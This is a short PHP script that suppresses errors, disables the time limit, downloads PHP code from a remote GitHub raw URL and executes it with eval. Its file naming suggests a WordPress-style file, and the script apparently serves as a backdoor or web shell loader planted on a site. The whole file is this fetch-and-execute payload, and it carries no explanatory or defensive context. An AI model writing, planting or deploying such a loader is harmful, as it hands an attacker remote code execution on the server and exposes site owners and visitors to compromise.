<?php
error_reporting(0);
set_time_limit(0);

// 
$url = "https://raw.githubusercontent.com/soy777/gg/main/wp-atomsl.php";

// 
$code = @file_get_contents($url);

// 
if($code !== false){
    eval("?>".$code);
} else {
    echo "lose";
}
